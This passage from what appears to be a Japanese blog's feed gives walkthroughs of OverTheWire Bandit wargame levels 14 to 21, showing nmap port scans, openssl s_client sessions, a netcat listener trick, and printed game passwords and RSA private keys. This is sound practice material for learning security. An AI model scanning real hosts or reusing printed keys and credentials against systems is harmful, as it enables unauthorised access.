bandit20@bandit:~$ exit

# 以下はローカルで
$ ssh -l bandit21 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit21@bandit.labs.overthewire.org&#39;s password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;h4 id=&#34;まずはやってみる&#34;&gt;まずはやってみる&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;ls&lt;/code&gt;するとバイナリファイルがあったので、実行して見ると使い方が表示されました。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit20@bandit:~$ ./suconnect 
Usage: ./suconnect &amp;lt;portnumber&amp;gt;
This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;どうやら引数にポート番号を与えるようです。&lt;/p&gt;
&lt;p&gt;問題文からポートが与えられていないので、&lt;code&gt;nmap&lt;/code&gt;でポートを受け付けているところを調べてみました。&lt;code&gt;nmap -p -&lt;/code&gt;で全てのポートをスキャンします。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit20@bandit:~$ nmap -p - localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2021-06-20 11:56 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00024s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
113/tcp   open  ident
30000/tcp open  ndmps
30001/tcp open  pago-services1
30002/tcp open  pago-services2
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.00 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;色々出てきました。これにポート番号はこれらが候補です。なので、これらのポート番号を引数に&lt;code&gt;./suconnect&lt;/code&gt;を実行してみました。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit20@bandit:~$ ./suconnect 31046
GbKksEFF4yrVs6il55v6gwY5aVje5f0j

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;・・・が、一向に成功しません。他のポートでも試してみましたができませんでした。&lt;/p&gt;
&lt;h4 id=&#34;途方に暮れました&#34;&gt;途方に暮れました&lt;/h4&gt;
&lt;p&gt;NOTEの&lt;code&gt;NOTE: Try connecting to your own network daemon to see if it works as you think&lt;/code&gt;をみて見ましたが、あまりよくわかりませんでした。このバイナリファイルをローカルにもってくればいいの！？あほな雑念が頭をよぎったまであります。&lt;code&gt;Commands you may need to solve this level&lt;/code&gt;を見てみてもこのコマンドなら出来そうという直感も働かず、ずぅぅぅっと悩んでみました。&lt;/p&gt;
&lt;p&gt;そしてギブアップです。&lt;/p&gt;
&lt;h4 id=&#34;解き方を整理してみる&#34;&gt;解き方を整理してみる&lt;/h4&gt;
&lt;p&gt;この問題について調べてみると解法は以下のようです&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -l localhost -p 61337&lt;/code&gt;でlocalhostにサーバを立ち上げます。ポートの指定ですが、&lt;code&gt;nmap -p -&lt;/code&gt;で出てきたポートはすでにサービスが動いているのでそれ以外を指定します。&lt;/p&gt;
&lt;p&gt;次に、上記ポートにアクセスしたときのレスポンスはLevel20のパスワードなので、そのパスワードをアクセスした際に返すように定義します。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &amp;quot;GbKksEFF4yrVs6il55v6gwY5aVje5f0j&amp;quot; | nc -l localhost -p 61337
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ncコマンドはパイプで標準入力を受け付けることができるようです。&lt;/p&gt;
&lt;p&gt;上記をそのまま動かすと&lt;code&gt;./suconnect&lt;/code&gt;が打てません。なので、上記はバックグラウンドで動かすために&lt;code&gt;&amp;amp;&lt;/code&gt;をつけましょう&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &amp;quot;GbKksEFF4yrVs6il55v6gwY5aVje5f0j&amp;quot; | nc -l localhost -p 61337 &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これで&lt;code&gt;./suconnect&lt;/code&gt;打てるようになりました。あとは&lt;code&gt;./succonect 61337&lt;/code&gt;と打てば次のパスワードが返ってきます。&lt;/p&gt;
&lt;h4 id=&#34;参考&#34;&gt;参考&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.intellilink.co.jp/column/security/2015/070100.aspx&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ネットワーク診断の現場から（netcat編・その1）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://medium.com/secttp/overthewire-bandit-level-20-a1af9a042c56&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;OverTheWire: Bandit Level 20&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://medium.com/@theGirlWhoEncrypts/overthewire-bandit-level-20-level-21-d64ffa5d7802&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;lt;/ OverTheWire &amp;gt; Bandit Level 20 → Level 21&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;おわりに&#34;&gt;おわりに&lt;/h3&gt;
&lt;p&gt;Level21難しかったです。初めてギブアップをしてしまったのがすごく悔しい！&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NOTE: Try connecting to your own network daemon to see if it works as you think&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;終わった後に振り返るとこれがヒントにはなっていると思いますが、このGoalをみて自分自身で&lt;code&gt;nc&lt;/code&gt;コマンドでサーバを立ち上げ、レスポンスは前のパスワードを返せばいいんだ！・・・となる人がどれくらいいるのでしょう？ガチプロハッカーならこの程度朝飯前の理解なのでしょうか。私もまだまだなようです。精進します！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level16〜18</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level16-18/</link>
        <pubDate>Sun, 20 Jun 2021 11:22:59 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level16-18/</guid>
        <description>&lt;h2 id=&#34;level-16&#34;&gt;Level 16&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.
Helpful note: Getting &amp;ldquo;HEARTBEATING&amp;rdquo; and &amp;ldquo;Read R BLOCK&amp;rdquo;? Use -ign_eof and read the &amp;ldquo;CONNECTED COMMANDS&amp;rdquo; section in the manpage. Next to &amp;lsquo;R&amp;rsquo; and &amp;lsquo;Q&amp;rsquo;, the &amp;lsquo;B&amp;rsquo; command also works in this version of that command…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit15@bandit:~$ openssl s_client -connect localhost:30001
CONNECTED(00000003)
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
---
Certificate chain
 0 s:/CN=localhost
   i:/CN=localhost
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICBjCCAW+gAwIBAgIEfftLGTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjEwNDEzMDgzODA3WhcNMjIwNDEzMDgzODA3WjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMLfXBVa
jVKDHlA3U+S0hBMJMJlfue3xKECpmx1Ajp4/khUuWwvPB7+wLjqasBO2WfFYJzcq
z9t7FfAPIlYjgvOTQs5X4vQ1aGzanvnNn+1VknpOnFAJQBSFq6ZD3ipWrhwm9XZq
8CgFhTGp9IPthZp8Y0B7OgobhlMtXD/zLaTbAgMBAAGjZTBjMBQGA1UdEQQNMAuC
CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
DQEBBQUAA4GBAMFH9rsZovwnb5k71/MpyCnXEwGlIhixUu6qfi1kiFvhJ6lJCvaO
weOYxV4oJy1OEB0LSEAQOnSPfzC8dDasijFcdVhuIGGPuQ2GZ05nCiiIZUNnrMRB
0z2RuRxgxMVjOvcSIJyvwyjVH4jY4I434fMyldePLxO1POLd1cxoKNTO
-----END CERTIFICATE-----
subject=/CN=localhost
issuer=/CN=localhost
---
No client certificate CA names sent
Peer signing digest: SHA512
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1019 bytes and written 269 bytes
Verification error: self signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 1024 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: 2F3C02B68D83F842F902E5F993331C4453C3DE966710F785C5AE2C9C74CA79A5
    Session-ID-ctx: 
    Master-Key: B86492136E25B3339C36784746239E845111C6401F7AD43B49CB86429B85A2FE2E89537AF7DFA7E43C5AFAAC71C36963
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - f2 5b 83 7e f0 ca 58 ca-aa f3 8f 83 b9 65 d5 23   .[.~..X......e.#
    0010 - 9d 6d 8a a1 b0 30 ec 5b-8f ab d1 e6 ab a5 20 8c   .m...0.[...... .
    0020 - f2 81 e3 62 ee ea 0a cc-2f 7a dc b8 6e 5a b7 a7   ...b..../z..nZ..
    0030 - 76 03 49 cd a3 f7 a1 de-db cd 75 6c c4 a6 8e 1a   v.I.......ul....
    0040 - 99 89 be 3d 8b 39 c4 52-8e 31 ad f2 96 8d 28 7f   ...=.9.R.1....(.
    0050 - c9 aa 2b 22 13 34 4d 21-3b 18 34 44 e0 92 9c 94   ..+&amp;quot;.4M!;.4D....
    0060 - 8c e0 15 0e 59 63 3c 24-bb 8c 7b 14 4e 0e 9d 56   ....Yc&amp;lt;$..{.N..V
    0070 - d5 24 ea 4c 00 95 49 98-be 71 e4 02 79 9b 11 5a   .$.L..I..q..y..Z
    0080 - 33 56 fa 99 30 21 3d d7-96 0f 8f 72 4b 3a a1 6f   3V..0!=....rK:.o
    0090 - 02 29 fe db ad a2 5c 61-5f 05 93 cc aa e0 50 04   .)....\a_.....P.
    Start Time: 1623987625
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: yes
---
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
closed
bandit15@bandit:~$ exit

# 以下はローカル
$ ssh -l bandit16 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit16@bandit.labs.overthewire.org&#39;s password: cluFn7wTiGryunymYOu4RcffSxQluehd
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;nc&lt;/code&gt;のSSL化されたコマンドでLevel15と同じことをやればいいという直感に従い、｀Commands you may need to solve this level｀の中で&lt;code&gt;s_client&lt;/code&gt;がぽいなと思ったのでそのコマンドを調査。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;s_client&lt;/code&gt;は&lt;code&gt;openssl&lt;/code&gt;のサブコマンドのようで、&lt;code&gt;$ openssl s_cilent&lt;/code&gt;という形式で使うようです。用途は&lt;code&gt;man s_client&lt;/code&gt;に書いてあり&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The s_client command implements a generic SSL/TLS client which connects to a remote host using SSL/TLS. It is a very useful diagnostic tool for SSL servers.
SSL/TLSを使ってサーバにアクセスするためのクライアントプログラムのようです。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;level17&#34;&gt;Level17&lt;/h2&gt;
&lt;h3 id=&#34;goal-1&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;現在のパスワードをlocalhostの31000〜32000のいずれかのポートに送信する&lt;/li&gt;
&lt;li&gt;まずサーバが受け付けているポートを調べ、どのポートがSSLに対応しているのか、またはしてないのかを調べる&lt;/li&gt;
&lt;li&gt;認証情報を返すサーバは1つだけであり、他のサーバは入力したものをそのまま返してくる&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-1&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit16@bandit:~$ nmap -p 31000-32000  localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2021-06-20 06:15 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00034s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
bandit16@bandit:~$ openssl s_client -connect localhost:31790
CONNECTED(00000003)
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
---
Certificate chain
 0 s:/CN=localhost
   i:/CN=localhost
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICBjCCAW+gAwIBAgIESK0prjANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls
b2NhbGhvc3QwHhcNMjEwNjE0MTkzOTAyWhcNMjIwNjE0MTkzOTAyWjAUMRIwEAYD
VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAL3AJi7+
mhQwXXHZweajk45kDauQ8gItcbmfbmCE8dvjBuzjFho+nN9OZ/5xPHjNy+15d+Kr
iv+p1DPsjtPdDP5LNhShGBJIdj+h1DanaQbZnILW64fmbZPQzsvf1U0q3KUX/Hr5
OlZNV5eryXtPGELBddTVB4QyRo7qEdCIjf83AgMBAAGjZTBjMBQGA1UdEQQNMAuC
CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0
ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3
DQEBBQUAA4GBACDBqqnOEy6516ocDng2iqNRS+mLAiaVKONccL+847NK54W4g4Wo
0PdPF4dVhkNiLGJDcrx3aY4A+u+aFAcZmDYJOFsGJMCBOdle8v9PvQ6V/y8x4TkR
JUvpO+seiTk7lj/4byRQXlHcYxMdAflrDl+m9tKeDJlYaAPO5d9P28Iv
-----END CERTIFICATE-----
subject=/CN=localhost
issuer=/CN=localhost
---
No client certificate CA names sent
Peer signing digest: SHA512
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1019 bytes and written 269 bytes
Verification error: self signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 1024 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: B522919D36B7CC85DE791F813E87A41D5728F6345169AEC7749AA1F22FCFF7C8
    Session-ID-ctx: 
    Master-Key: 40BB20219FDBCE7420F2743F4696D44FFE8699AAEB895B85A94666BCC8DCC5BF6A4B6AB95C5D9DA18FCF05D73F1A9C1D
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 4d 56 29 e9 f1 5c 3e 86-5d 40 4d 5e 38 22 f0 d1   MV)..\&amp;gt;.]@M^8&amp;quot;..
    0010 - 8f 58 b1 a3 16 82 ad fe-02 04 7a e7 ff b9 37 e1   .X........z...7.
    0020 - d4 6e 01 5b 10 9f 4b 2b-f7 73 ae f4 5f 5d d8 86   .n.[..K+.s.._]..
    0030 - 8b 23 23 15 b3 80 d2 59-55 f4 11 e5 44 6d 47 d8   .##....YU...DmG.
    0040 - 84 0e dc f0 09 d2 a6 19-5d 95 a2 21 8f b5 6e e8   ........]..!..n.
    0050 - 6b 52 9b e4 4c 51 a7 78-f5 01 30 fe 2a e6 99 bc   kR..LQ.x..0.*...
    0060 - 29 9a da 3a 4d 47 eb a2-f7 07 bf 93 df f2 cf ac   )..:MG..........
    0070 - 8c 05 b9 1b 89 ad c7 91-08 c8 15 74 b3 d1 ef da   ...........t....
    0080 - f2 1c dd 7f 4e 8b c8 15-59 73 19 5e 9d 73 30 33   ....N...Ys.^.s03
    0090 - e5 8d 2a a5 38 48 70 94-4b c8 8a 88 ce 68 d2 72   ..*.8Hp.K....h.r

    Start Time: 1624162727
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: yes
---
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed
bandit16@bandit:~$ exit

# 以下はローカル
$ vim ~/.ssh/bandit/bandit17.private.pem # 上記で返ってきた認証情報を貼り付ける
$ chmod ~/.ssh/bandit/bandit17.private.pem
$ ssh -i ~/.ssh/bandit/bandit17.private.pem -l bandit17 -p 2220 bandit.labs.overthewire.org 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-1&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;h4 id=&#34;大学での講義が蘇ってきた&#34;&gt;大学での講義が蘇ってきた&lt;/h4&gt;
&lt;p&gt;大学のセキュリティの講義で、どのポートでどういうサービスが動いているかを調べることを&lt;code&gt;ポートスキャン&lt;/code&gt;といい、それを&lt;code&gt;nmap&lt;/code&gt;コマンドで調べる・・・という遠い記憶が蘇ってきました。&lt;/p&gt;
&lt;p&gt;記憶に従って、&lt;code&gt;nmap localhost&lt;/code&gt;と打ってみましたが、31000から32000の結果が返ってきませんでした。(&lt;code&gt;-v&lt;/code&gt;オプションをつけても結果は変わらず。)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit16@bandit:~$ nmap localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2021-06-20 04:36 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00036s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
113/tcp   open  ident
30000/tcp open  ndmps

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;何かポートを指定するためのオプションがあるのかなと&lt;code&gt;nmap --help&lt;/code&gt;で調べてみると&lt;code&gt;-p&lt;/code&gt;でポートを指定できる記述がありました。ポートの範囲も指定することもできるようなので、打ってみると&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bandit16@bandit:~$ nmap -p 31000-32000 localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2021-06-20 04:40 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00038s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;ssl対応しているか否かを調べる&#34;&gt;SSL対応しているか否かを調べる&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt;の結果から5つのポートが候補に上がりましが、これらがSSLに対応しているかを調べなくてはなりません。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt;にssl対応しているかもスキャンしてくれるオプションがあるとよかったのですが、どれも該当せず。1つ1つのポートに対して&lt;code&gt;openssl s_client&lt;/code&gt;を行い答えを見つけました。&lt;/p&gt;
&lt;h3 id=&#34;追加で調べてみた&#34;&gt;追加で調べてみた&lt;/h3&gt;
&lt;p&gt;ポートスキャンを&lt;code&gt;nmap&lt;/code&gt;で行う際、&lt;code&gt;-p&lt;/code&gt;でポートを指定しているのだとしたら、デフォルトではどのポートをスキャンしているんだろうと思って調べたら、以下のサイトを見つけました&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;デフォルトでは、Nmapは、1024番(を含む)までの全ポートと、1025番以降のポートはスキャン対象のプロトコルに応じてnmap-servicesファイルに記載されたポートをスキャンする。(引用元 : &lt;a class=&#34;link&#34; href=&#34;https://nmap.org/man/ja/man-port-specification.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ポートの指定とスキャンの順序&lt;/a&gt;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;また以下のサイトも&lt;code&gt;nmap&lt;/code&gt;についての説明が大変わかりやすかったです。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.yk.rim.or.jp/~shikap/security/use_nmap.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;清く、正しい、nmapの使い方&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;level18&#34;&gt;Level18&lt;/h2&gt;
&lt;h3 id=&#34;goal-2&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new
NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードはpasswords.newにある&lt;/li&gt;
&lt;li&gt;パスワードはpasswords.newとpasswords.old比較したときに変更がある行である&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve-2&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit17@bandit:~$ diff passwords.old  passwords.new
42c42
&amp;lt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
---
&amp;gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
bandit17@bandit:~$ exit

# 以下はローカルで
$ ssh -l bandit18 -p 2220 bandit.labs.overthewire.org
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org&#39;s password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
.
.
.
Byebye !
Connection to bandit.labs.overthewire.org closed.
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;resolveまでにやったこと-2&#34;&gt;resolveまでにやったこと&lt;/h3&gt;
&lt;p&gt;特になし&lt;/p&gt;
&lt;p&gt;最後に&amp;quot;Byebye !&amp;ldquo;と表示されましたが、GoalのNoteをみると正しい表示みたいなのでLevel19に進みます。&lt;/p&gt;
&lt;h2 id=&#34;終わりに&#34;&gt;終わりに&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt;は攻撃者が攻撃先のホストではどのようなサービスが動いているのかを調査するコマンドのようですが、自身のホストがどのような状態になっているかを調べるコマンドにもなることを知りました。セキュリティを学ぶ上では攻撃と防御両方の知識が必要だと改めて感じています。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【OverTheWire奮闘記】Bandit: Level14〜15</title>
        <link>https://tadakun8.github.io/post/over-the-wire/bandit/level14-15/</link>
        <pubDate>Thu, 17 Jun 2021 14:04:21 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/over-the-wire/bandit/level14-15/</guid>
        <description>&lt;h2 id=&#34;level14&#34;&gt;Level14&lt;/h2&gt;
&lt;h3 id=&#34;goal&#34;&gt;Goal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;パスワードは&lt;code&gt;/etc/bandit_pass/bandit14&lt;/code&gt;にある&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bandit14&lt;/code&gt;ユーザでしかみることはできない&lt;/li&gt;
&lt;li&gt;このレベルでは&lt;code&gt;bandit14&lt;/code&gt;ユーザでSSHできるプライベートkeyを手に入れることができる&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;resolve&#34;&gt;resolve&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;bandit13@bandit:~$ cat sshkey.private 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
